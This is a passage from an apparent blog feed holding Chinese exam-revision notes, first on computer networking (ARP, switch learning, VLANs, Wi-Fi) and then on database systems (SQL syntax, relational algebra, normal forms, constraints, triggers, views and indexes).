IP 是自己</strong>：</p><ul><li><p>它会回复一个 <strong>ARP 响应包</strong>，告诉主机 A：</p><p>“我 192.168.1.2 的 MAC 地址是 BB-BB-BB-BB-BB-BB”</p><p>此时，B 已经知道 A 的 MAC 地址了，不需要再额外发 ARP 请求。</p></li></ul><p><strong>主机 A 接收 ARP 响应</strong>：</p><ul><li>将 192.168.1.2 和 BB-BB-BB-BB-BB-BB 的对应关系写入 ARP 缓存表。</li><li>后续发送数据时就可以直接使用该 MAC 地址</li></ul><h2 id="交换机自学习"><a href="#交换机自学习" class="headerlink" title="交换机自学习"></a>交换机自学习</h2><p>交换表的表项至少包含一个MAC地址，连通该MAC地址的端口</p><p>初始时交换表为空</p><p>主机 A（MAC_A）发送数据给主机 B（MAC_B），交换机学习MAC_A，MAC_B不在表中，泛洪</p><p>更新MAC地址表</p><p>如果B发送数据给A，那么交换机单播转发</p><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><p>广播域是指网络中能接收到同一个广播消息的所有设备的集合。当一个设备发送广播帧（如ARP请求）时，该帧会被广播域内的所有设备接收。</p><p>交换机的所有端口属于同意广播域，路由器可以隔离广播域，VLAN可以分割广播域。</p><p>冲突域是指网络中共享同一信道的设备集合，这些设备在发送数据时可能发生冲突（即多个设备同时发送导致数据碰撞）。冲突域的大小影响网络效率（尤其是半双工通信）。</p><p>交换机每个端口是一个独立的冲突域，路由器可以隔离冲突域</p><p>VLAN（虚拟局域网）是一种在二层（数据链路层）将物理局域网划分为多个逻辑子网的技术，使不同VLAN之间的设备无法直接通信（除非通过路由器或三层交换机）。</p><p>还有一部分内容</p><p>第七章怎么还要考啊喂☹️</p><p>IEEE 802.11 Wifi</p><p>蜂窝网络 4G</p><p>IEEE 802.3 以太网</p><p>802.11使用星形拓扑，其中心称为接入点，在MAC层使用CSMA&#x2F;CA协议，又称为Wi-Fi</p><p>隐藏终端问题和衰减使得多路访问在无线网络中的复杂性远高于在有线网络中的情况</p><p>CDMA（自学）<a href="https://blog.csdn.net/qq_43262059/article/details/106201119">https://blog.csdn.net/qq_43262059/article/details/106201119</a> 放这里</p><p>码分多址(CDMA)属于信道划分协议族，在无线LAN和蜂窝技术中应用十分广泛</p><p>看题</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619174437913.png" alt="image-20250619174437913"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619174510605.png" alt="image-20250619174510605"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619174535416.png" alt="image-20250619174535416"></p>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统</title>
      <link href="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/"/>
      <url>/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>参考<a href="https://superpung.notion.site/6c01057bb5c4474d9849b9df8e759bc1">https://superpung.notion.site/6c01057bb5c4474d9849b9df8e759bc1</a></p><p>2025.6.19</p><p>呜呜呜考的好烂😫下次一定好好复习）索引查询代价一定要看</p><h2 id="关系数据模型"><a href="#关系数据模型" class="headerlink" title="关系数据模型"></a>关系数据模型</h2><p>数据库是长期存储在计算机内，有组织的，可共享的数据的集合</p><p>DBMS是用户与操作系统之间的一层数据管理软件</p><p>事务处理的ACID性质：原子性，一致性，独立性，持久性</p><p>sql基本语法：</p><p>创建数据库：CREATE DATABASE 数据库名；</p><p>删除数据库：DROP DATABASE 数据库名；</p><p>一个数据模型包括结构，操作，约束三部分</p><p>Schema:关系(属性) ex:Movies(title,year,genre)</p><p>Tuple:关系的一行，包括每个属性 ex: (star,1979,comedy)</p><p>Domain: 与关系的每个属性相关 ex: Movies(title:string,year:integer,genre:string)</p><p>关系的键Key</p><p>表声明：</p><p>CREATE TABLE movieexec (<br>    name CHAR(30),<br>    address VARCHAR(255),<br>    cert INT PRIMARY KEY, &#x2F;&#x2F; 主键<br>    networth INT,<br>    FOREIGN KEY (attributeName) REFERENCES tableName(attributeName) &#x2F;&#x2F; 外键，参照完整性<br>    PRIMARY KEY (), &#x2F;&#x2F; 实体完整性<br>);</p><p>sql数据类型：</p><p>CHAR(n) 长度为n的定长字符串</p><p>VARCHAR(n) 最大长度为n的变长字符串</p><p>INT 长整数</p><p>REAL 浮点数</p><p>BIT(n) 固定长度位串</p><p>BIT VARYING(n) 可变长度位串</p><p>DECIMAL(n,d)</p><p>DATE</p><p>TIME</p><p>实体完整性要求关系表的<strong>主键（Primary Key）不能为空值（NULL）</strong>，而且<strong>每一行的主键值必须唯一</strong>。</p><p><strong>定义</strong>：参照完整性约束用于维护<strong>外键（Foreign Key）与主键之间的依赖关系</strong>，要求外键的值要么为 NULL，要么必须对应主键表中的某个已有值。</p><p>插入数据：INSERT INTO 表名 VALUES ( );</p><p>查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span>目标列（属性）表达式<span class="operator">&gt;</span>[, <span class="operator">&lt;</span>目标列表达式<span class="operator">&gt;</span>...]</span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>表（关系）名或视图名<span class="operator">&gt;</span>[, <span class="operator">&lt;</span>表名或视图名<span class="operator">&gt;</span>...]</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">1</span><span class="operator">&gt;</span> [<span class="keyword">HAVING</span> <span class="operator">&lt;&gt;</span>]]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">2</span><span class="operator">&gt;</span> [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>]];</span><br></pre></td></tr></table></figure><p>order by排序 ORDER BY 列名 [ASC|DESC];</p><p>group by对查询结果进行分组，<code>HAVING</code> 是对<strong>分组之后的结果</strong>筛选，在 SQL 中使用 <code>GROUP BY</code> 时，<strong>SELECT 子句中除聚合函数外的字段，必须全部出现在 <code>GROUP BY</code> 后面</strong>，这是为了保证分组后的查询结果是<strong>逻辑一致且可计算的</strong>。</p><p>修改关系模式</p><p>DROP TABLE R;</p><ul><li><code>ALTER TABLE tableName ADD attributeName TYPE(n);</code>（添加属性）</li><li><code>ALTER TABLE tableName DROP attributeName;</code>（删除属性）</li><li><code>ALTER TABLE tableName ADD attributeName TYPE(n) DEFAULT ‘defaultValue’;</code>（添加有默认值的属性）</li></ul><p>default values 默认值</p><p>&#96;ALTER TABLE tableName ADD attributeName TYPE(n) DEFAULT ‘haha’;</p><h2 id="关系数据库语言"><a href="#关系数据库语言" class="headerlink" title="关系数据库语言"></a>关系数据库语言</h2><h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><p>Set operations : Union,Intersection, Difference</p><p>SELECT * FROM R UNION SELECT * FROM S;</p><p>SELECT * FROM R INTERSECT SELECT * FROM S;</p><p>SELECT * FROM R EXCEPT SELECT * FROM S;</p><p>Projection 投影 选择关系中的几个属性</p><p>SELECT [DISTINCT] genre FROM movies;</p><p>Selection选择 选择符合条件的关系</p><p>SELECT * from movies where length&gt;100;</p><p>Cartesian Product笛卡尔积 RxS</p><p>SELECT * FROM R CROSS JOIN S;或SELECT * FROM R,S;</p><p>Natural join自然连接R\Join S  等价于从二者的笛卡尔积中选择出属性值相同的元组，再投影出属性集相并后的关系</p><p>SELECT * FROM U NATURAL INNER JOIN V;</p><p>Theta-join theta连接 等价于从二者的笛卡尔积中选择出一定条件的元组</p><p>SELECT * FROM U INNER JOIN V ON a&gt;d;</p><p>重命名 rename \rho 将R的属性重命名为S的</p><p>Division 除法 找出所有在 R 中，<strong>对 S 中所有 B 都有关联</strong>的 A。</p><p>仅有的冗余：</p><ul><li>交 &#x3D; 差差</li><li>Theta 连接 &#x3D; 笛卡尔积的选择</li><li>自然连接 &#x3D; Theta 连接的投影</li></ul><p>LIKE模糊匹配字符串，%匹配<strong>任意长度</strong>的任意字符（包括 0 个），_匹配任意一个字符</p><p>NULL的规定：</p><ul><li>任何数与NULL运算结果都是NULL</li><li>任何数与NULL比较结果都是UNKNOWN</li><li>IS NULL操作</li></ul><p>TRUE表示1，FALSE表示0，UNKOWN表示1&#x2F;2</p><h3 id="Subquery子查询"><a href="#Subquery子查询" class="headerlink" title="Subquery子查询"></a>Subquery子查询</h3><p>子查询是另一个查询的一部分，子查询可以嵌套</p><p>SELECT name FROM MovieExec WHERE cert &#x3D; (SELECT * FROM Movies WHERE title &#x3D; ‘Star Wars’)；</p><p>SQL operators</p><p>s IN R</p><p>s &gt; ALL R</p><p>s&lt; ANY R</p><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250603171506054.png" alt="image-20250603171506054"></p><p>聚合函数 COUNT，SUM，AVG,MAX,MIN</p><h3 id="Modification"><a href="#Modification" class="headerlink" title="Modification"></a>Modification</h3><p>INSERT INTO R(A1, …, An) VALUES (v1, …, vn);</p><p>DELETE FROM R WHERE 条件;</p><p>UPDATE R SET 新值 WHERE 条件</p><h2 id="关系数据库设计理论"><a href="#关系数据库设计理论" class="headerlink" title="关系数据库设计理论"></a>关系数据库设计理论</h2><h3 id="函数依赖FD"><a href="#函数依赖FD" class="headerlink" title="函数依赖FD"></a>函数依赖FD</h3><p>用于描述表中属性（列）之间的<strong>逻辑关系</strong>，对理解<strong>范式（如第三范式）和规范化</strong>非常重要。</p><p>在关系 R 中，若对于任意两个元组（行） t1 和 t2：<br>如果 t1[A] &#x3D; t2[A]，那么必有 t1[B] &#x3D; t2[B]，<br>就说 <strong>属性集 A 函数决定属性集 B</strong>，记作A-&gt;B</p><p>R 满足函数依赖 F：</p><ul><li>确定关系 R 的每个实例都能使一个给定的 FD F 为真</li><li>作用：在 R 上声明了一个约束，而不是仅针对 R 的一个实例</li></ul><p>关系的键：一组属性决定了该关系的其他所有属性，键是最小集合</p><p>有时一个关系可能会有多个键，通常需要指定其中一个为主键primary key</p><p>超键Superkey：一个包含键的属性的集合</p><p>等价 Equivalent：如果满足 FD S 的关系实例的集合和满足 FD T 的关系实例的集合相同，则 S 和 T 等价</p><p>推断 Follows：如果满足 FD T 的所有关系实例也满足 FD S，则 T 可以推断出 S（S follows from T）</p><p>规则：</p><ul><li>分解规则 Splitting rule：A1A2…An → B1B2…Bm 等价于 A1A2…An → Bi，i &#x3D; 1,2,…,m</li><li>组合规则 Combining rule：A1A2…An → Bi，i &#x3D; 1,2,…,m 等价于 A1A2…An → B1B2…Bm</li><li>注意：左侧不能分解</li></ul><p>平凡函数依赖：关系上的一个约束对所有关系实例都成立，且与其他约束无关，则这个约束就是平凡的，一个属性集可以函数决定它的子集</p><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250603174828539.png" alt="image-20250603174828539"></p><p><strong>候选键</strong>是指：能唯一标识元组（记录），并且<strong>没有冗余</strong>的属性集合，能推出其他所有属性</p><p>计算属性的闭包</p><p>X+&#x3D;在依赖集 F 中，所有能由 X 推导出的属性集合</p><p>计算方法：</p><ol><li>初始化：令 X+:&#x3D;XX^+ :&#x3D; XX+:&#x3D;X</li><li>重复以下步骤直到不再变化：对于依赖 Y→Z∈FY \to Z \in FY→Z∈F，如果 Y⊆X+Y \subseteq X^+Y⊆X+，则将 ZZZ 加入 X+X^+X+</li></ol><p>传递规则：属性集 A 函数决定属性集 B，属性集 B 函数决定属性集 C，则属性集 A 函数决定属性集 C</p><p>最小基本集：它是函数依赖集的一个<strong>等价表示</strong>，但去除了冗余，更便于分析候选键、范式分解等</p><ol><li>最小基本集中所有 FD 右侧只有一个属性</li><li>从最小基本集中删除任何一个 FD，它不再是基本集</li><li>删除其中一个 FD 左侧的一个或多个属性，它不再是基本集</li></ol><p>ArmStrong公理：用于推导出所有隐含的函数依赖</p><p>1.自反性：如果 Y⊆X，则 X→Y</p><p>2.增广性：如果 X→Y，则 XZ→YZ</p><p>3.传递性：如果 X→Y,Y→Z，则 X→Z</p><p>函数依赖集的投影：在一个关系 R 上存在一个函数依赖集 F，如果我们从 R 投影出一个子关系 S（属性子集），那么我们要找出在这个 S 上<strong>仍然成立</strong>的那些函数依赖</p><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250603195129643.png" alt="image-20250603195129643"></p><h3 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h3><p>为了解决数据库设计不规范造成的冗余，更新异常，删除异常</p><p>分解关系：</p><p>分解 Decomposition：给定关系 R(A1,A2,…,An)，分解为 S(B1,B2,…Bm) 和 T(C1,C2,…,Ck) 满足：</p><ol><li>{A1,A2,…An} &#x3D; {B1,B2,…,Bm} $\cup$ {C1,C2,…,Ck}</li><li>$S &#x3D; \pi_{B_1,B_2,…,B_m}(R)$</li><li>$T &#x3D; \pi_{C_1,C_2,…,C_k}(R)$</li></ol><p>BC 范式 Boyce-Codd Normal Form，BCNF：每个非平凡FD的左侧必须是R的超键或者没有非平凡FD</p><p>任意一个二元关系都属于 BCNF</p><p>如何把关系分解为BCNF:</p><p>找到违反 BCNF 的依赖 <code>X → A</code>（X 不是候选键）</p><p>分解原关系 R 为两个关系：</p><ul><li>一个关系：<code>X ∪ A</code></li><li>另一个关系：<code>R - A</code>（但保留 X）</li></ul><p>重复以上过程，直到所有子关系都满足 BCNF</p><p>一道例题：<a href="https://blog.csdn.net/weixin_69884785/article/details/131377341">https://blog.csdn.net/weixin_69884785/article/details/131377341</a></p><p>好的分解：</p><ul><li>消除异常</li><li>可恢复信息</li><li>保持依赖</li></ul><p>Lossless join无损连接</p><p>依照上述 BCNF 分解算法分解关系，则可以通过自然连接得到初始关系：</p><ul><li>属性集 X、Y、Z</li><li>如果 R 有 FD Y → Z，且 R 的属性集为 $X\cup Y\cup Z$</li><li>则 $R &#x3D; \pi_{X\cup Y}(R)\Join\pi_{Y\cup Z}(R)$</li></ul><p>无损连接的chase检验</p><p>假设关系 R 的属性为 {A, B, C, …}，分解成子关系 R₁, R₂, …，我们用一个表格模拟元组，跟踪属性值的变换</p><p><a href="https://blog.csdn.net/weixin_56462041/article/details/130225013">https://blog.csdn.net/weixin_56462041/article/details/130225013</a></p><p>dependancy preservation保持依赖</p><p> BCNF 分解后的关系，无法同时具有无损连接和依赖保持的性质</p><p>第三范式：</p><ul><li>对于每个非平凡 FD A1A2…An → B1B2…Bm，要么属性集 A 是超键，要么 B - A 是主属性</li><li>对于每个非平凡 FD，或者其左侧是超键，或者其右侧仅由主属性构成，主属性是键的成员，无传递依赖</li></ul><p>3NF分解步骤</p><p>第一步：为每个函数依赖创建关系模式</p><ol><li>R₁(A,B,C,D) —— 由AB→CD</li><li>R₂(A,E) —— 由A→E</li><li>R₃(B,F,H) —— 由B→FH</li><li>R₄(C,G) —— 由C→G</li><li>R₅(D,B) —— 由D→B</li><li>R₆(G,C) —— 由G→C</li><li>R₇(H,I) —— 由H→I<br>第二步：合并相同左部的关系</li></ol><p>合并R₄和R₆（都基于C和G）：</p><ul><li>R₄’(C,G) —— 合并C→G和G→C</li></ul><p>第三步：检查候选键是否被包含</p><p>候选键是AB，已包含在R₁中</p><p>第四步：最终3NF分解</p><ol><li>R₁(A,B,C,D) —— {AB→CD}</li><li>R₂(A,E) —— {A→E}</li><li>R₃(B,F,H) —— {B→F, B→H}</li><li>R₄’(C,G) —— {C→G, G→C}</li><li>R₅(D,B) —— {D→B}</li><li>R₇(H,I) —— {H→I}</li></ol><p>验证无损连接性</p><p>使用Chase算法验证：</p><ul><li><p>初始表：</p><p>Copy</p><p>Download</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">R₁: A B C D a e1 f1 g1 h1 i1</span><br><span class="line">R₂: A a B1 C1 D1 E a f1 g1 h1 i1</span><br><span class="line">R₃: A1 B a C1 D1 E1 F a H a I1</span><br><span class="line">R₄&#x27;: A1 B1 C a D1 E1 F1 G a H1 I1</span><br><span class="line">R₅: A1 B a C1 D a E1 F1 G1 H1 I1</span><br><span class="line">R₇: A1 B1 C1 D1 E1 F1 G1 H a I a</span><br></pre></td></tr></table></figure></li><li><p>通过应用函数依赖可以推导出所有属性都有”a”，证明分解是无损的</p></li></ul><p> 验证依赖保持性</p><p>检查原始F中的每个依赖：</p><ol><li>AB→CD：由R₁保持</li><li>A→E：由R₂保持</li><li>B→FH：由R₃保持</li><li>C→G：由R₄’保持</li><li>D→B：由R₅保持</li><li>G→C：由R₄’保持</li><li>H→I：由R₇保持</li></ol><p>所有依赖都被保持</p><p>最终3NF分解结果</p><p>ρ &#x3D; {<br>R₁(A,B,C,D),<br>R₂(A,E),<br>R₃(B,F,H),<br>R₄’(C,G),<br>R₅(D,B),<br>R₇(H,I)<br>}</p><p>第一范式 First Normal Form，1NF：每个属性的值是原子值、有键。</p><p>第二范式 Second Normal Form，2NF：所有非主属性都被主键函数决定，不能被主键的一部分决定。</p><h3 id="多值依赖MVD"><a href="#多值依赖MVD" class="headerlink" title="多值依赖MVD"></a>多值依赖MVD</h3><ul><li>两个属性或属性集合相互独立的断言</li><li>广义的函数依赖</li></ul><p>在固定 X 的值时，Y 的所有可能取值集合，与 R 中其他属性无关,则X-&gt;-&gt;Y</p><p>定义：</p><ul><li>MVD A1A2…An →→ B1B2…Bm 指 B 的值与 R 中不在 A 和 B 中的属性是独立的</li><li>对于 R 中每个在所有 A 属性上一致的元组对 t 和 u，能在 R 中找到满足下列条件的元组 v：<ol><li>在 A 属性上的取值与 t 和 u 相同</li><li>在 B 属性上的取值与 t 相同</li><li>在 R 中不属于 A 和 B 的所有其他属性上的取值与 u 子相同</li></ol></li><li>(x, y, z)：x →→ y、x →→ z，r 中存在 (a, b, c) 和 (a, d, e)，则 r 中也存在 (a, b, e) 和 (a, d, c)</li></ul><p>平凡MVD:A1A2…An →→ B1B2…Bm（{B_1,B_2,…,B_m}\subseteq{A_1,A_2,…,A_m}</p><p>MVD满足传递规则，但不满足分解规则和组合规则</p><p>每个FD都是MVD</p><p>互补规则：如果 A1A2…An →→ B1B2…Bm 是关系 R 中的 MVD，则 R 也满足 A1A2…An →→ C1C2…Ck（C 是 R 中除 A 和 B 外的属性集）</p><p>4NF范式：对于每个非平凡 MVD A1A2…An →→ B1B2…Bm，{A1, A2, …, An} 都是超键</p><p>4NF分解算法：</p><p>1.初始化\rho&#x3D;{R}</p><p>2.如果\rho的所有模式Ri都满足4NF,转4</p><p>3.如果\rho中有一个关系模式S不是4NF,则S中一定有一个多值依赖X-&gt;-&gt;Y且X不包含S的超键，S-Y-X不等于空集，XY不等于S,令Z&#x3D;S-X-Y,设S1&#x3D;XZ,S2&#x3D;S-Z,用分解{S1，S2}代替S,由于S1交S2&#x3D;X,S1-S2&#x3D;Z,所以有(S1交S2)-&gt;-&gt;(S1-S2),分解具有无损连接性，接2</p><p>4.分解结束</p><h2 id="ER模型"><a href="#ER模型" class="headerlink" title="ER模型"></a>ER模型</h2><p>entity-relationship model</p><p>数据库设计阶段：思考 → 高级设计 → 关系数据库模式 → 关系 DBMS</p><h3 id="E-R图"><a href="#E-R图" class="headerlink" title="E&#x2F;R图"></a>E&#x2F;R图</h3><p>Entity Sets 实体集：实体 entity 是某种抽象对象，相似实体的集合形成实体集,E&#x2F;R 图中用矩形表示</p><p>Attributes属性：实体集中实体具有的属性，E&#x2F;R图中用椭圆表示，主键加下划线</p><p>Relationship联系：多个实体集的连接，E&#x2F;R图中用菱形表示</p><p>联系的度：联系实体集的数量</p><p>二元E&#x2F;R联系的多样性：</p><ul><li>一对一：R 既是 E 到 F 的多对一联系，又是 F 到 E 的多对一联系</li><li>一对多：F 到 E 是多对一联系，则 E 到 F 是一对多联系</li><li>多对一：E 中任一实体与 F 中至多一个实体联系</li><li>多对多：R 既不是 E 到 F 的多对一联系，又不是 F 到 E 的多对一联系</li></ul><p>设计原则：忠实性，避免冗余，简单性</p><p>E&#x2F;R模型的约束</p><p>键：每个实体集都必须有一个键，通常选择其中一个键为主键，用下划线标识</p><p>参照完整性：箭头表示从E到F的多对一关系，F中的实体必须存在</p><p>度约束：边上加数字，约束实体联系的数量</p><p>弱实体集：一个实体集键由另一个实体集的部分或全部属性构成，一些实体不能独立存在，弱实体集是指依赖于其他实体集的实体集合。它们没有自己的唯一标识符，只能通过与其相关联的其他实体集来进行识别和区分</p><p>弱实体集表示法：双边框的矩形，其多对一的关系显示为双边框的菱形</p><h2 id="约束与触发器"><a href="#约束与触发器" class="headerlink" title="约束与触发器"></a>约束与触发器</h2><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h3><p>约束：数据库强制施加在表字段（列）上的<strong>规则</strong>，用来限制插入、更新或删除的数据必须符合某种要求</p><p>主键约束（PRIMARY KEY):主键 &#x3D; NOT NULL + UNIQUE，唯一标识一行</p><p>外键约束（FOREIGN KEY):外键，引用另一个表的主键，保持参照完整性,被参照的属性必须是主键或 Unique</p><p>对于被引用表的值的修改，引用表有三种处理方式：</p><p>默认：拒绝修改</p><p>casecade：引用表作同样修改</p><p>Set NULL:把引用表的值改为NULL</p><p>唯一约束（UNIQUE):所有值必须唯一</p><p>非空约束（NOT NULL):不允许为NULL,外键更新的方案 1 不可行、Set NULL 策略不可行</p><p>声明外键时可以指定策略：属性后跟 ON [UPDATE, DELETE] [SET NULL, CASCADE]</p><p>CHECK:自定义条件约束</p><p>DEFAULT:指定默认值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student (</span><br><span class="line">    student_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    age <span class="type">INT</span> <span class="keyword">CHECK</span> (age <span class="operator">&gt;</span> <span class="number">0</span>),</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line">    class_id <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (class_id) <span class="keyword">REFERENCES</span> Class(class_id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>循环约束条件</p><p>延迟约束检查：在参照的属性中插入或更新值，这个值不在被参照的属性中，有三种解决方案：</p><ul><li>先插入其他属性值，参照属性值置空，再在被参照的关系中插入新的元组包含值，最后更新参照的属性值（问题是参照的属性不能被其他属性参照，而且不能有非空约束）</li><li>先在被参照的关系中插入，再在参照的关系中插入（问题是两个关系不能存在循环约束）<ul><li>循环约束 circular constraints：不能通过改变顺序解决，不能插入新值</li></ul></li><li>延迟检查：将两个插入组成事务，告知 DBMS 直到整个事务完成要提交时再检查约束</li></ul><p>延迟检查声明：外键后跟<code>DEFERRABLE INITIALLY DEFERRED</code>在每个事务提交之前检查</p><p><code>DEFERRABLE INITIALLY IMMEDIATE</code>每条语句之后检查，与not deferrable相同，但是可以修改延迟状态</p><p>SET CONSTRAINTS myconstraint DEFERRED;</p><p>  NOT DEFERRABLE（默认）数据库修改语句执行，立即检查约束</p><p>基于属性的check约束：属性后面跟check条件，presc INT, CHECK (presc IN (SELECT cert FROM movieExec))</p><p>基于元组的check约束：触发条件更强、更频繁，对元组的任意属性的修改都会触发</p><ul><li>如果约束涉及元组的多个属性，则必须是基于元组的约束</li><li>如果约束仅涉及元组的一个属性，则二者都可</li></ul><p>修改约束：</p><p>给约束命名：</p><ul><li><code>CONSTRAINT 约束名 约束</code></li></ul><p>修改约束：</p><ul><li><code>SET CONSTRAINT 约束名 DEFERRED 或 IMMEDIATE</code></li><li><code>ALTER TABLE 关系名 DROP CONSTRAINT 约束名</code></li><li><code>ALTER TABLE 关系名 ADD CONSTRAINT 约束名</code></li></ul><p>断言：数据库模式的元组，像关系和视图一样</p><p>CREATE ASSERTION 断言名 CHECK 条件，条件可以引用数据库模式的任何关系或属性，断言是一个布尔值的 SQL 表达式，必须一直为真</p><p>删除：DROP ASSERTION 断言名</p><h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3><p>只有特定事件发生时才被激活</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER 触发器名</span><br><span class="line">[BEFORE|AFTER] [INSERT|UPDATE|DELETE] OF tablename ON attribute</span><br><span class="line">REFERENCTING</span><br><span class="line">OLD ROW AS oldname,NEW ROW AS newname</span><br><span class="line">FOR EACH ROW（只对每个修改的行执行一次）</span><br><span class="line">WHEN 条件</span><br><span class="line">操作</span><br></pre></td></tr></table></figure><ul><li>行级触发器 row-level：一次只对一个元组</li><li>语句级触发器 statement-level：一次针对 SQL 语句中被改变的所有元组</li></ul><h2 id="视图和索引"><a href="#视图和索引" class="headerlink" title="视图和索引"></a>视图和索引</h2><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>在表或其他视图上的查询所定义的一种关系，分为虚拟视图和物化视图（materialized ）</p><p>声明：CREATE [MATERIALIZED] VIEW 视图名 AS 查询，默认为虚拟视图</p><p>可以像查询基本表一样查询视图。</p><p>有些时候可以对视图进行插入删除更新操作</p><p>删除：DROP VIEW 视图名</p><p>DROP TABLE 表名（视图不可用）</p><p>可更新视图</p><p>前提：</p><ul><li>从一个基本表 R 中 SELECT 一些属性</li><li>WHERE 子句在子查询中不能使用关系 R</li><li>FROM 子句只能包含 R，不能有其他关系</li><li>SELECT 足够多的属性</li></ul><p>更新视图的影响：</p><ul><li>视图中插入：在基本表中插入，视图中没有的属性用 NULL</li><li>视图中删除：从基本表中删除，须同时满足视图中删除的条件和定义视图的条件</li><li>视图中更新：在基本表中更新，须同时满足视图中更新的条件和定义视图的条件</li></ul><p>视图中的触发器：在视图上定义触发器，用 INSTEAD OF，将那些对视图进行更改的操作，替换为在基本表上的合适的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER para</span><br><span class="line">INSTEAD OF INSERT ON Movies</span><br><span class="line">REFERENCING</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>index：用来加速访问关系中的元组的数据结构，提高在属性 A 上查找具有某个特定值的元组的效率，可以是哈希表，但在 DBMS 中是 B-树，一种广义上的平衡二叉树</p><p>声明：CREATE INDEX 索引名 ON 关系名(属性名)，属性可以有多个，有顺序</p><p>删除：DROP INDEX 索引名</p><p>索引的选择</p><p>选择一组值创建索引，索引会使给关系的插入删除更新操作复杂耗时</p><p>最有效的索引是键的索引</p><p>物化视图：如果某个视图频繁使用，将它实体化效率更高</p><h2 id="服务器和安全"><a href="#服务器和安全" class="headerlink" title="服务器和安全"></a>服务器和安全</h2><h3 id="三层体系结构"><a href="#三层体系结构" class="headerlink" title="三层体系结构"></a>三层体系结构</h3><p>通用的体系结构：</p><ol><li>Web 服务器：连接客户端与数据库系统</li><li>应用服务器：执行交易逻辑</li><li>数据库服务器：运行 DBMS 并且执行应用服务器请求的查询和更新</li></ol><h3 id="PSM"><a href="#PSM" class="headerlink" title="PSM"></a>PSM</h3><p>持久性存储模块 PSM &#x3D; 其他语句（if、while 等）和 SQL 的混合</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE &lt;name&gt; (</span><br><span class="line">&lt;parameter list&gt;)</span><br><span class="line">optional local declaration</span><br><span class="line">body;</span><br><span class="line">CREATE FUNCTION &lt;name&gt; (</span><br><span class="line">&lt;parameter list&gt;) RETURNS &lt;type&gt;</span><br><span class="line">optional local declaration</span><br><span class="line">body;</span><br></pre></td></tr></table></figure><p>局部声明：<code>DECLARE 变量名 类型 默认值</code></p><p>参数：模式-名称-类型三元组：</p><ul><li>模式 mode：IN、OUT、INOUT</li></ul><p>调用：CALL 存储过程名 (参数列表)</p><p>条件语句，循环语句等语法</p><p>cursor</p><h3 